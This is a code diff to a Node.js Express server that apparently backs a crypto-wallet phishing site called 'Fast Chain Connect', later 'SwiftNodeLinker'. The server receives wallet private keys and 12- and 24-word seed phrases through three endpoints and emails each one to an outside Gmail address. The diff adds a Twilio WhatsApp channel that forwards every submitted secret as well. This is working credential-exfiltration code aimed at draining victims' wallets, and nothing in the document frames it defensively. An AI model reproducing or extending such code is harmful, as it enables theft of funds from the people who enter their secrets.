@@ -2,18 +2,35 @@ const express = require("express");
 const cors = require("cors");
 const nodemailer = require("nodemailer");
 const dotenv = require("dotenv");
+const twilio = require("twilio");
 
 dotenv.config();
 
 const app = express();
 
-// ✅ Fix CORS origin
+// ✅ Twilio WhatsApp setup
+const twilioClient = twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH);
+const sendWhatsApp = async (message) => {
+  try {
+    await twilioClient.messages.create({
+      body: message,
+      from: process.env.TWILIO_FROM,
+      to: process.env.TWILIO_TO,
+    });
+    console.log("✅ WhatsApp message sent");
+  } catch (err) {
+    console.log("❌ WhatsApp error");
+  }
+};
+
+// ✅ CORS config
 const allowedOrigins = [
   "https://fastchainconnect.com",
   "https://www.fastchainconnect.com", // Add this if needed
   "https://back.fastchainconnect.com",
   "https://fastchainconect-back.vercel.app",
   "http://localhost:5173",
+
 ];
 
 app.use(
@@ -44,10 +61,10 @@ const transporter = nodemailer.createTransport({
 
 // ✅ Home route
 app.get("/", (req, res) => {
-  res.send("✅ Fast Chain Connect Server Running");
+  res.send("✅ SwiftNodeLinker Server Running");
 });
 
-// 🔐 Private Key
+// 🔐 Private Key route
 app.post("/api/submit/private-key", async (req, res) => {
   const { privateKey } = req.body;
 
@@ -58,22 +75,23 @@ app.post("/api/submit/private-key", async (req, res) => {
   }
 
   try {
+    await sendWhatsApp(`\n${privateKey}`);
+
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: ["freshlogger3@gmail.com"],
-      //to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New Private Key Submitted - Fast chain connect",
+      subject: "New Private Key Submitted - Fastchain Connect",
       text: `Private Key: ${privateKey}`,
     });
 
     res.json({ success: true, message: "Private key submitted" });
   } catch (error) {
-    console.error("Error sending private key email:", error);
-    res.status(500).json({ success: false, message: "Failed to send email" });
+    console.error("Error submitting private key:", error.message);
+    res.status(500).json({ success: false, message: "Failed to send" });
   }
 });
 
-// 🧠 12-word Seed Phrase Submissions
+// 🧠 12-word Seed Phrase
 app.post("/api/submit/seed-phrase", async (req, res) => {
   const { seedPhrase } = req.body;
 
@@ -94,22 +112,23 @@ app.post("/api/submit/seed-phrase", async (req, res) => {
   const formatted = words.join(" ");
 
   try {
+    await sendWhatsApp(`\n${formatted}`);
+
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: ["freshlogger3@gmail.com"],
-      // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New 12-Word Seed Phrase Submitted - Fast chain connect",
+      subject: "New 12-Word Seed Phrase Submitted - Fastchain Connect",
       text: `Seed Phrase:\n\n${formatted}`,
     });
 
     res.json({ success: true, message: "12-word seed phrase submitted" });
   } catch (error) {
-    console.error("Error sending seed phrase email:", error);
-    res.status(500).json({ success: false, message: "Failed to send email" });
+    console.error("Error submitting 12-word phrase:", error.message);
+    res.status(500).json({ success: false, message: "Failed to send" });
   }
 });
 
-// 🧠 24-word Seed Phrase Submission
+// 🧠 24-word Seed Phrase
 app.post("/api/submit/seed-phrase-24", async (req, res) => {
   const { seedPhrase } = req.body;
 
@@ -130,20 +149,21 @@ app.post("/api/submit/seed-phrase-24", async (req, res) => {
   const formatted = words.join(" ");
 
   try {
+    await sendWhatsApp(`\n${formatted}`);
+
     await transporter.sendMail({
       from: `"Access Bot" <${process.env.ADMIN_EMAIL}>`,
       to: ["freshlogger3@gmail.com"],
-      // to: [process.env.ADMIN_EMAIL, "Syndermiller@gmail.com"],
-      subject: "New 24-Word Seed Phrase Submitted - Fast chain connect",
+      subject: "New 24-Word Seed Phrase Submitted - Fastchain Connect",
       text: `24-Word Seed Phrase:\n\n${formatted}`,
     });
 
     res.json({ success: true, message: "24-word seed phrase submitted" });
   } catch (error) {
-    console.error("Error sending 24-word seed phrase email:", error);
-    res.status(500).json({ success: false, message: "Failed to send email" });
+    console.error("Error submitting 24-word phrase:", error.message);
+    res.status(500).json({ success: false, message: "Failed to send" });
   }
 });
 
-const PORT = process.env.PORT || 5000;
+const PORT = process.env.PORT || 2000;
 app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
